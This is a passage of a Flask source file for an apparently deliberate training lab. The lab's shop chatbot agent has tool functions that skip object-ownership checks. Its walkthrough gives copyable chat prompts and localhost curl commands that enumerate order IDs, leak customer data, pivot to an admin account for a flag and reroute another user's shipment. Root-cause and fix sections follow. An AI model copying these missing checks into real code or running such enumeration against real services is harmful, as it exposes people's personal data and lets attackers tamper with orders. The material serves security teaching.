      <span class="n">STEP 2</span>
      <h4>Read-based IDOR — guess an adjacent order ID</h4>
      <p>Order IDs are sequential (<code>ORD-9001</code>, <code>ORD-9000</code>, <code>ORD-9002</code>...). Just ask for a neighbouring ID — nothing says it has to be yours.</p>
      <div class="payload-label">💬 Chat message</div>
      <div class="payload"><button class="copy" onclick="copyP(this)">Copy</button>Show me details for order ORD-9000</div>
      <button class="try-btn" onclick="loadIntoChat('Show me details for order ORD-9000')">▶ Load into chat</button>
      <div class="payload-label">⌨ curl (terminal)</div>
      <div class="payload curl"><button class="copy" onclick="copyP(this)">Copy</button>curl -s http://localhost:5054/invoke \
  -H "Content-Type: application/json" \
  -d '{"q":"Show me details for order ORD-9000","mode":"production"}' | python3 -m json.tool</div>
      <p style="margin-top:8px;">You'll get <b>Rahul Mehta's</b> full name, email, home address and card digits — a customer you've never met.</p>
    </div>

    <div class="step">
      <span class="n">STEP 3</span>
      <h4>Enumerate more IDs</h4>
      <div class="payload-label">💬 Chat message</div>
      <div class="payload"><button class="copy" onclick="copyP(this)">Copy</button>Show me details for order ORD-9002</div>
      <button class="try-btn" onclick="loadIntoChat('Show me details for order ORD-9002')">▶ Load into chat</button>
      <div class="payload-label">⌨ curl (terminal)</div>
      <div class="payload curl"><button class="copy" onclick="copyP(this)">Copy</button>curl -s http://localhost:5054/invoke \
  -H "Content-Type: application/json" \
  -d '{"q":"Show me details for order ORD-9002","mode":"production"}' | python3 -m json.tool</div>
      <p style="margin-top:8px;">Also try <code>ORD-8990</code> — notice its account owner is <code>ACC-1000</code>, not a normal customer ID.</p>
      <div class="payload-label">💬 Chat message</div>
      <div class="payload"><button class="copy" onclick="copyP(this)">Copy</button>Show me details for order ORD-8990</div>
      <button class="try-btn" onclick="loadIntoChat('Show me details for order ORD-8990')">▶ Load into chat</button>
      <div class="payload-label">⌨ curl (terminal)</div>
      <div class="payload curl"><button class="copy" onclick="copyP(this)">Copy</button>curl -s http://localhost:5054/invoke \
  -H "Content-Type: application/json" \
  -d '{"q":"Show me details for order ORD-8990","mode":"production"}' | python3 -m json.tool</div>
    </div>

    <div class="step">
      <span class="n">STEP 4</span>
      <h4>Pivot: fetch that account's profile</h4>
      <p><code>ORD-8990</code> revealed the owning account ID <code>ACC-1000</code>. The account-profile tool has the same missing check — ask for it directly.</p>
      <div class="payload-label">💬 Chat message</div>
      <div class="payload"><button class="copy" onclick="copyP(this)">Copy</button>Show me the account profile for ACC-1000</div>
      <button class="try-btn" onclick="loadIntoChat('Show me the account profile for ACC-1000')">▶ Load into chat</button>
      <div class="payload-label">⌨ curl (terminal)</div>
      <div class="payload curl"><button class="copy" onclick="copyP(this)">Copy</button>curl -s http://localhost:5054/invoke \
  -H "Content-Type: application/json" \
  -d '{"q":"Show me the account profile for ACC-1000","mode":"production"}' | python3 -m json.tool</div>
      <div class="callout warn" style="margin-top:10px;">The flag is in that account's <code>internal_notes</code> field — a staff/admin account you were never authorized to view.</div>
    </div>

    <div class="step">
      <span class="n">STEP 5</span>
      <h4>Write-based IDOR — tamper with someone else's order</h4>
      <p>The most severe variant: <code>update_order_address</code> also has no ownership check. You can silently reroute a stranger's shipment.</p>
      <div class="payload-label">💬 Chat message</div>
      <div class="payload"><button class="copy" onclick="copyP(this)">Copy</button>Update the shipping address for order ORD-9000 to 42 Attacker Lane, Mumbai, MH 400001</div>
      <button class="try-btn" onclick="loadIntoChat('Update the shipping address for order ORD-9000 to 42 Attacker Lane, Mumbai, MH 400001')">▶ Load into chat</button>
      <div class="payload-label">⌨ curl (terminal)</div>
      <div class="payload curl"><button class="copy" onclick="copyP(this)">Copy</button>curl -s http://localhost:5054/invoke \
  -H "Content-Type: application/json" \
  -d '{"q":"Update the shipping address for order ORD-9000 to 42 Attacker Lane, Mumbai, MH 400001","mode":"production"}' | python3 -m json.tool</div>
      <p style="margin-top:8px;">Rahul Mehta's package now ships to an address you control — a horizontal privilege-escalation write, not just a read.</p>
    </div>

    <div class="step">
      <span class="n">STEP 6</span>
      <h4>Confirm the defenses (optional)</h4>
      <p>Same requests, but with <code>"mode":"staging"</code> or <code>"mode":"compliance"</code> instead of <code>"production"</code> — either in the Staff console dropdown, or by editing the curl JSON body directly:</p>
      <div class="payload-label">⌨ curl (terminal — hardened mode)</div>
      <div class="payload curl"><button class="copy" onclick="copyP(this)">Copy</button>curl -s http://localhost:5054/invoke \
  -H "Content-Type: application/json" \
  -d '{"q":"Show me details for order ORD-9000","mode":"staging"}' | python3 -m json.tool</div>
      <ul>
        <li><b>Staging (Hardened):</b> all three tools now check the requested ID against your session's own account — any mismatched ID is denied.</li>
        <li><b>Compliance (Guardrailed):</b> same ownership check, kept strict even under ID-format variations.</li>
      </ul>
    </div>
  </div>

  <div class="help-content" id="tab-why" style="display:none;">
    <h3>Root Cause</h3>
    <p>This is <b>OWASP API1:2023 – Broken Object Level Authorization</b>, surfaced through an AI agent instead of a REST endpoint. The underlying bug is identical to a classic IDOR:</p>
    <ol>
      <li>The tool functions (<code>get_order_details</code>, <code>get_account_profile</code>, <code>update_order_address</code>) accept an ID and fetch/mutate the matching record.</li>
      <li>They never compare that record's owner against the authenticated session (<code>CURRENT_SESSION</code>).</li>
      <li>The AI agent happily calls the tool with <b>whatever ID the user types</b> — it has no concept of "this isn't your object".</li>
    </ol>
    <div class="callout">Unlike the function-calling/excessive-agency lab, prompt wording can't fix this — the missing check lives entirely in the <b>tool implementation</b>, not the system prompt. This is why "Production" and later modes use the exact same system prompt; only the tool code changes.</div>
    <h3>Two variants, one root cause</h3>
    <ul>
      <li><b>Read-based BOLA</b> (<code>get_order_details</code>, <code>get_account_profile</code>): confidentiality impact — mass enumeration of every customer's PII, address, and partial payment data, and pivoting from a low-privilege object to a high-privilege admin account.</li>
      <li><b>Write-based BOLA</b> (<code>update_order_address</code>): integrity impact — an attacker can modify another user's data (e.g. reroute a shipment), which is typically rated more severe than a read-only leak.</li>
    </ul>
  </div>

  <div class="help-content" id="tab-fix" style="display:none;">
    <h3>How to fix it</h3>
    <div class="callout fix">Authorization must be enforced at the object level, inside the tool/function itself — never assumed from the fact that a request was authenticated at all. This applies to every tool that reads OR writes an object, not just the read paths.</div>
    <h3>1 · Ownership check on every object fetch and mutation</h3>
    <div class="payload"><button class="copy" onclick="copyP(this)">Copy</button>def get_order_details(order_id, session):
    order = db.get_order(order_id)
    if order.owner_id != session.account_id:
        return deny("not your order")
    return order

def update_order_address(order_id, new_address, session):
    order = db.get_order(order_id)
    if order.owner_id != session.account_id:
        return deny("not your order")
    order.address = new_address
    db.save(order)</div>
    <h3>2 · Don't let the LLM supply the "whose" — bind it server-side</h3>
    <p>The agent should never accept an arbitrary account/order ID for "my" data — the session's own ID should be injected server-side, not trusted from model output.</p>
    <h3>3 · Non-sequential, non-guessable IDs</h3>
    <p>UUIDs instead of sequential integers reduce (but don't eliminate) the enumeration risk — ownership checks are still mandatory.</p>
    <h3>4 · Treat write tools as higher risk than read tools</h3>
    <p>Require an extra confirmation step (or human-in-the-loop approval) before any tool call that mutates state on behalf of a user, on top of the ownership check.</p>
    <div class="callout fix">Staging and Compliance modes in this lab demonstrate item 1 — flip the environment to compare.</div>
  </div>
</aside>

<script>
const PRODUCTS = [
  {e:'🎧',n:'Wireless Earbuds Pro',p:'₹2,499',o:'₹3,999',r:'4.3★ (12k)'},
  {e:'⌚',n:'FitTrack Smart Watch',p:'₹3,299',o:'₹4,999',r:'4.1★ (8.7k)'},
  {e:'💺',n:'Ergo Office Chair',p:'₹6,999',o:'₹9,499',r:'4.2★ (5.1k)'},
  {e:'🧴',n:'Vitamin C Serum',p:'₹499',o:'₹799',r:'4.5★ (21k)'},
  {e:'👟',n:'Running Shoes Air+',p:'₹2,199',o:'₹3,299',r:'4.0★ (9.9k)'},
  {e:'🔌',n:'65W GaN Charger',p:'₹1,099',o:'₹1,599',r:'4.5★ (11k)'},
];
function card(p){
  return `<div class="pcard"><div class="thumb">${p.e}</div><div class="body">
    <div class="name">${p.n}</div><div class="meta">Free delivery · 7-day return</div>
    <div class="price">${p.p}${p.o?`<span class="old">${p.o}</span>`:''}</div>
    <div class="rating">${p.r}</div><button class="addbtn">Add to Cart</button></div></div>`;
}
document.getElementById('product-grid').innerHTML = PRODUCTS.map(card).join('');

function showPage(p){
  document.getElementById('page-home').style.display = p==='home' ? 'block':'none';
  document.getElementById('page-orders').style.display = p==='orders' ? 'block':'none';
  document.getElementById('page-account').style.display = p==='account' ? 'block':'none';
}

function toggleStaffStrip(){document.getElementById('staff-strip').classList.toggle('open');applyEnv();}
const ENV_META = {
  production:{chip:'PRODUCTION',text:'Live environment — no object-level authorization checks.'},
  staging:{chip:'STAGING',text:'Hardened — object ownership is verified against your session.'},
  compliance:{chip:'COMPLIANCE',text:'Guardrailed — strict ownership checks on every object fetch.'}
};
function applyEnv(){
  const v=document.getElementById('env-select').value, m=ENV_META[v];
  document.getElementById('env-text-inline').textContent = m.text;
  const mini=document.getElementById('env-mini');
  mini.textContent=m.chip; mini.classList.add('show');
}

let chatOpen=false;
function openChat(){document.getElementById('chat-panel').classList.add('open');document.getElementById('chat-fab').style.display='none';chatOpen=true;}
function closeChat(){document.getElementById('chat-panel').classList.remove('open');document.getElementById('chat-fab').style.display='flex';chatOpen=false;}
function openChatWith(text){openChat();document.getElementById('chat-in').value=text;send();}
function sendQuick(text){document.getElementById('chat-in').value=text;send();}
function loadIntoChat(text){closeHelp();openChat();document.getElementById('chat-in').value=text;document.getElementById('chat-in').focus();}

function addUserMsg(t){
  const body=document.getElementById('chat-body');
  body.insertAdjacentHTML('beforeend', `<div class="msg user"><div class="bubble">${escapeHtml(t)}</div></div>`);
  body.scrollTop=body.scrollHeight;
}
function addTyping(){
  const body=document.getElementById('chat-body');
  body.insertAdjacentHTML('beforeend', `<div class="msg bot" id="typing-row"><div class="typing"><span></span><span></span><span></span></div></div>`);
  body.scrollTop=body.scrollHeight;
}
function removeTyping(){const t=document.getElementById('typing-row');if(t)t.remove();}
function addBotMsg(reply, call, result, err, reqId, insight){
  const body=document.getElementById('chat-body');
  let html = `<div class="msg bot"><div class="bubble">${escapeHtml(reply)}`;
  if(call) html += `<div class="toolcall">⚙ ${escapeHtml(call)}</div>`;
  if(err) html += `<div class="toolresult err">${escapeHtml(err)}</div>`;
  else if(result) html += `<div class="toolresult">${escapeHtml(result)}</div>`;
  if(insight) html += `<div class="insight">${escapeHtml(insight)}</div>`;
  html += `</div><div class="meta-line">${reqId||''}</div></div>`;
  body.insertAdjacentHTML('beforeend', html);
  body.scrollTop=body.scrollHeight;
}
function escapeHtml(s){return (s||'').replace(/[&<>]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;'}[c]));}

async function send(){
  const inp=document.getElementById('chat-in');
  const q=inp.value.trim();
  if(!q) return;
  const env = document.getElementById('env-select') ? document.getElementById('env-select').value : 'production';
  addUserMsg(q);
  inp.value='';
  document.getElementById('chat-send').disabled=true;
  addTyping();
  try{
    const r=await fetch('/invoke',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({q:q,mode:env})});
    const d=await r.json();
    removeTyping();
    if(d.chat){
      addBotMsg(d.chat, null, null, null, d.request_id, null);
    } else if(d.error){
      addBotMsg("Hmm, I couldn't complete that.", d.call, null, d.error, d.request_id, null);
    } else {
      addBotMsg("Here's what I found:", d.call, d.result, null, d.request_id, d.insight);
    }
  }catch(e){
    removeTyping();
    addBotMsg("Sorry, I'm having trouble reaching our systems right now.", null, null, String(e), '', null);
  }finally{
    document.getElementById('chat-send').disabled=false;
  }
}

function openHelp(){document.getElementById('help-overlay').classList.add('open');document.getElementById('help-panel').classList.add('open');}
function closeHelp(){document.getElementById('help-overlay').classList.remove('open');document.getElementById('help-panel').classList.remove('open');}
function tab(t){
  document.querySelectorAll('.help-tab').forEach(x=>x.classList.toggle('active',x.dataset.tab===t));
  ['walk','why','fix'].forEach(x=>document.getElementById('tab-'+x).style.display=(x===t?'block':'none'));
}
function copyP(btn){const txt=btn.parentElement.textContent.replace(/^Copy/,'');navigator.clipboard.writeText(txt.trim());const o=btn.textContent;btn.textContent='Copied!';setTimeout(()=>btn.textContent=o,1200);}
document.addEventListener('keydown',e=>{if(e.key==='Escape'){closeHelp();}});
applyEnv();
</script>
</body></html>"""

@app.route("/")
def index():
    return render_template_string(HTML_PAGE)

@app.route("/invoke", methods=["POST"])
def invoke():
    data = request.get_json(force=True, silent=True) or {}
    env  = data.get("mode", "production")
    mode = ENV_MAP.get(env, "vulnerable")
    q    = data.get("q", "")
    req_id = "REQ-" + uuid.uuid4().hex[:8].upper()

    # ---- BUG FIX: handle greetings/small-talk deterministically,
    # before ever calling the LLM, so "hello" can never be
    # hallucinated into a random tool call. ----
    canned = smalltalk_reply(q)
    if canned is not None:
        log_event(env, q, "", "chat")
        return jsonify({"chat": canned, "request_id": req_id})

    p = f"{SYS}\n\nUser: {q}\nFunction call:"

    try:
        r = call_llm_raw(p)
        raw = r.json().get("response", "").strip()
    except Exception as e:
        log_event(env, q, "", "err")
        return jsonify({"call": "", "error": f"Assistant unavailable: {e}", "request_id": req_id})

    # Model chose to chat instead of calling a tool.
    if raw.upper().startswith("CHAT:"):
        chat_reply = raw.split(":", 1)[1].strip() if ":" in raw else raw
        log_event(env, q, "", "chat")
        return jsonify({"chat": chat_reply or "How can I help with your order or account?", "request_id": req_id})

    fname, args, call = extract_tool_call(raw)
    if not fname:
        log_event(env, q, raw[:200], "no-op")
        return jsonify({
            "chat": "I can look up an order, update a shipping address, or your account profile — do you have an order ID or account ID?",
            "request_id": req_id
        })

    parsed = parse_call_args(args)

    fn = ALLOWED.get(fname)
    if not fn:
        log_event(env, q, call, "err")
        return jsonify({"call": call, "error": f"Unknown tool: {fname}", "request_id": req_id})

    try:
        result = fn(*parsed, mode)
        insight = build_insight(fname, parsed, result, mode)
        log_event(env, q, call, "ok")
        return jsonify({"call": call, "result": result, "insight": insight, "request_id": req_id})
    except TypeError as e:
        log_event(env, q, call, "err")
        return jsonify({"call": call, "error": f"Invalid arguments for {fname}: {e}", "request_id": req_id})
    except Exception as e:
        log_event(env, q, call, "err")
        return jsonify({"call": call, "error": str(e), "request_id": req_id})

@app.route("/admin/audit")
def admin_audit():
    return jsonify(AUDIT)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5054)
